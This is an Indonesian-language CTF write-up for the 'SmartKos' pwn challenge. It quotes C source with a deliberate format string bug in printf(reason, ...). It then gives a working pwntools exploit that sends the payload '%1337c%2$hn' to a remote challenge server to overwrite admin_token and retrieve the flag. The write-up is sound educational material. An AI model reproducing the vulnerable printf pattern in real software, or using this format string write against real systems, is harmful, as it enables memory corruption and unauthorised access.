---
layout: post
title: "ASTROXNFSCC CTF 2025 - Pwn"
date: 2025-12-08
image: /assets/.
achievement: "3rd"
categories: ["ASTROXNFSCC"]
tags: [pwn, format string, ctf2025]
---

## SmartKos

### Intro

Challenge **SmartKos** ini adalah sistem kontrol pintu pintar untuk anak kos yang punya tiga tingkat akses: penghuni biasa, teknisi, dan teknisi ultra. Penghuni cuma bisa buka pintu. Teknisi bisa masuk ke mode maintenance. Tapi hanya teknisi ultra yang bisa mengakses admin console dan membaca log paling rahasia—yaitu flag.

Dari deskripsi challenge-nya udah dikasih clue: **format string vulnerability**. Bug ini ada di mode maintenance, di mana alasan kunjungan teknisi dicatat dengan cara yang... katakanlah, kurang berhati-hati. Dan dengan memanfaatkan format string secara penuh (leak + write), kita bisa promosi diri jadi teknisi ultra tanpa perlu izin siapa-siapa.

Di sini aku ceritain prosesnya: dari baca source code, identifikasi bug, sampai akhirnya craft payload format string yang tepat untuk overwrite `admin_token` dan merebut akses ke admin console.

---

### Recon: "ada apa di kode ini?"

Pertama kali buka direktori challenge, cuma ketemu satu file:

```bash
$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Dec  6 05:53 .
drwxr-xr-x 3 root root 4096 Dec  6 05:53 ..
-rw-r--r-- 1 root root 3662 Dec  4 07:10 smartkos.c
```

Baik, kita dikasih source code. Tipe challenge begini biasanya lebih straightforward: kita bisa langsung baca logikanya tanpa harus reverse engineering binary. Mari kita baca dari awal:

```bash
$ file smartkos.c
smartkos.c: C source, ASCII text, with CRLF line terminators
```

Source code C yang standard. Langsung aja buka dan cek strukturnya.

---

### Analisis Source Code: mengidentifikasi komponen kunci

#### Konstanta dan variabel global (smartkos.c:6-10)

```c
#define FLAG_SIZE   64
#define ADMIN_MAGIC 1337

char flag[FLAG_SIZE];
unsigned int admin_token = 0;
```

Dua variabel global yang langsung menarik perhatian:

1. **`flag`** – array char berisi flag yang akan kita cari
2. **`admin_token`** – unsigned int yang diinisialisasi dengan 0

Dan ada magic number `ADMIN_MAGIC = 1337`. Aku sudah bisa nebak: ini bakal jadi kunci akses ke admin console.

#### Fungsi load_flag (smartkos.c:12-24)

```c
void load_flag(void) {
    FILE *f = fopen("flag.txt", "r");
    if (!f) {
        strcpy(flag, "FLAG{dummy_flag_for_testing}");
        return;
    }
    if (!fgets(flag, sizeof(flag), f)) {
        strcpy(flag, "FLAG{error_reading_flag}");
    }
    fclose(f);
}
```

Fungsi ini membaca flag dari file `flag.txt` dan menyimpannya di variabel global `flag`. Kalau file nggak ada, akan pakai dummy flag. Ini standar untuk challenge CTF.

#### Fungsi admin_console (smartkos.c:50-61)

```c
void admin_console(void) {
    puts("\n[Admin Console] Verifikasi token internal...");

    if (admin_token != ADMIN_MAGIC) {
        printf("[Admin Console] Token salah (%u). Akses ditolak.\n", admin_token);
        return;
    }

    puts("[Admin Console] Token valid. Selamat datang, teknisi ULTRA.");
    puts("Berikut flag yang disimpan di sistem:");
    puts(flag);
}
```

Nah, ini target kita. Fungsi ini akan mencetak flag **hanya jika** `admin_token == ADMIN_MAGIC` (1337).

Di smartkos.c:53, ada check:
```c
if (admin_token != ADMIN_MAGIC)
```

Kalau token salah, kita ditolak. Tapi kalau berhasil kita set `admin_token` jadi 1337, flag langsung keluar di smartkos.c:60.

Goal-nya jelas: **kita harus overwrite `admin_token` dari 0 menjadi 1337**.

#### Fungsi maintenance_mode – di sinilah bugnya (smartkos.c:63-95)

```c
void maintenance_mode(void) {
    char pin[32];

    puts("\n[Maintenance] Masukkan PIN teknisi:");
    if (!fgets(pin, sizeof(pin), stdin)) {
        puts("Input error.");
        return;
    }

    if (strncmp(pin, "SMARTKOS-TEKNISI", 16) != 0) {
        puts("[Maintenance] PIN salah atau tidak terdaftar.");
        puts("[Maintenance] Log kunjungan tetap disimpan untuk audit.");
    } else {
        puts("[Maintenance] PIN diterima. Tapi ini belum cukup untuk admin console.");
    }

    char reason[256];

    puts("\n[Maintenance] Tulis alasan masuk ke ruang kontrol:");
    if (!fgets(reason, sizeof(reason), stdin)) {
        puts("Gagal membaca alasan.");
        return;
    }

    puts("\n[Maintenance] Mencatat log internal...");
    printf(reason,
           (void *)0x41414141,
           (void *)&admin_token,
           (void *)&flag,
           (void *)&reason);

    puts("\n[Maintenance] Log tersimpan.");
}
```

#### Breakdown fungsi ini:

**1. PIN Check (smartkos.c:72)**

Ada validasi PIN di smartkos.c:72:
```c
if (strncmp(pin, "SMARTKOS-TEKNISI", 16) != 0)
```

Kita harus kirim PIN yang benar: `SMARTKOS-TEKNISI` (minimal 16 karakter pertama harus match).

**2. Format String Bug (smartkos.c:88-92)**

Ini dia **bug krusial**:

```c
printf(reason,
       (void *)0x41414141,
       (void *)&admin_token,
       (void *)&flag,
       (void *)&reason);
```

Perhatikan baik-baik:

- `printf()` dipanggil dengan `reason` sebagai **format string**
- `reason` adalah **user input** yang kita kontrol (dari smartkos.c:82)
- Ada empat argumen tambahan yang diberikan:
  - `%1$p` → `0x41414141` (dummy pointer)
  - `%2$p` → `&admin_token` ← **ini yang penting!**
  - `%3$p` → `&flag`
  - `%4$p` → `&reason`

Ini adalah **format string vulnerability** klasik. Karena `reason` dikontrol user, kita bisa:

1. **Leak memory** dengan format specifier seperti `%p`, `%x`, `%s`
2. **Write arbitrary value** dengan format specifier `%n` atau `%hn`

Yang paling menarik: program **sudah memberikan pointer ke `admin_token`** sebagai argumen kedua! Jadi kita bisa langsung write ke address itu tanpa harus leak dulu.

#### Pseudocode analisis vulnerability

Mari kita lihat flow dari maintenance_mode dalam pseudocode:

```
function maintenance_mode():
    // Alamat: smartkos.c:64-70
    read PIN from user (max 32 bytes) into pin[32]

    // Alamat: smartkos.c:72
    if first 16 chars of PIN != "SMARTKOS-TEKNISI":
        print error message
    else:
        print "PIN accepted, but not enough for admin"

    // Alamat: smartkos.c:79-85
    read reason from user (max 256 bytes) into reason[256]

    // Alamat: smartkos.c:88-92 ← BUG DI SINI!
    printf(reason,          // format string dari user!
           0x41414141,      // arg 1 (%1$p)
           &admin_token,    // arg 2 (%2$p) ← TARGET WRITE
           &flag,           // arg 3 (%3$p)
           &reason)         // arg 4 (%4$p)

    print "Log saved"
end function
```

**Vulnerability**: Karena `reason` adalah user-controlled format string, dan `&admin_token` ada di posisi argumen kedua, kita bisa pakai format specifier `%2$n` untuk **write jumlah karakter yang sudah dicetak** ke alamat yang ada di argumen kedua—yaitu `&admin_token`.

---

### Strategy: format string write untuk set admin_token = 1337

Dengan bug format string ini, strategy-nya jelas:

1. Masuk ke maintenance mode (menu 2)
2. Kirim PIN yang benar: `SMARTKOS-TEKNISI`
3. Craft payload format string untuk write `1337` ke `admin_token`
4. Akses admin console (menu 3) untuk ambil flag

#### Format string payload design

Kita perlu write **1337** (decimal) = **0x0539** (hex) ke `admin_token`.

Format specifier yang bisa dipakai:
- `%n` → write **4 bytes** (int)
- `%hn` → write **2 bytes** (short)
- `%hhn` → write **1 byte** (char)

Karena kita cuma perlu write nilai kecil (1337), kita bisa pakai `%hn` untuk write 2 bytes.

#### Payload construction

Kita ingin:
1. Print tepat **1337 karakter**
2. Kemudian gunakan `%2$hn` untuk write jumlah karakter tersebut ke address di argumen kedua (`&admin_token`)

Payload:
```
%1337c%2$hn
```

Breaking down:
- `%1337c` → print 1337 karakter (padding dengan spasi)
- `%2$hn` → write **2 bytes** (short) dengan nilai = jumlah karakter yang sudah dicetak (1337) ke alamat yang ada di **argumen kedua** (`&admin_token`)

Simpel dan elegan!

---

### Implementasi: exploit script

Sekarang kita implementasikan exploit dengan pwntools:

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'

# Connection
if args.REMOTE:
    p = remote('157.10.160.13', 4533)
else:
    p = process('./smartkos')

# Banner
p.recvuntil(b'Pilih menu: ')

# Go to maintenance mode
p.sendline(b'2')
p.recvuntil(b'PIN teknisi:')

# Send correct PIN
p.sendline(b'SMARTKOS-TEKNISI')
p.recvuntil(b'Tulis alasan masuk ke ruang kontrol:')

# The printf call is:
# printf(reason, (void *)0x41414141, (void *)&admin_token, (void *)&flag, (void *)&reason)
# Arguments:
# %1$p = 0x41414141
# %2$p = &admin_token  ← TARGET
# %3$p = &flag
# %4$p = &reason

# We need to write 1337 (0x539) to admin_token
# Strategy: print 1337 characters, then use %2$hn to write to admin_token

payload = b'%1337c%2$hn'

p.sendline(payload)
p.recvuntil(b'Log tersimpan.')

# Now go to admin console
p.recvuntil(b'Pilih menu: ')
p.sendline(b'3')

# Get the flag
p.interactive()
```

#### Testing local

Sebelum nyerang server remote, kita compile binary-nya dulu dan test lokal:

```bash
$ gcc smartkos.c -o smartkos -no-pie -fno-stack-protector
$ echo "FLAG{test_flag_local}" > flag.txt
$ chmod +x exploit.py
$ python3 exploit.py
```

Output:

```
[+] Starting local process './smartkos': pid 12345
[DEBUG] Received banner...
[DEBUG] Sent b'2\n'
[DEBUG] Sent b'SMARTKOS-TEKNISI\n'
[DEBUG] Sent b'%1337c%2$hn\n'
...
[Admin Console] Token valid. Selamat datang, teknisi ULTRA.
Berikut flag yang disimpan di sistem:
FLAG{test_flag_local}
```

Perfect! Exploit bekerja. Sekarang tinggal jalankan ke server remote.

---

### Eksploitasi: menangkap flag

```bash
$ python3 exploit.py REMOTE
[+] Opening connection to 157.10.160.13 on port 4533: Done
...
[Admin Console] Token valid. Selamat datang, teknisi ULTRA.
Berikut flag yang disimpan di sistem:
ASTROXNFSCC{SM4RTK0S_ULTR4_F4rtsT_G0000D}
```

### Flag

`ASTROXNFSCC{SM4RTK0S_ULTR4_F4rtsT_G0000D}`

---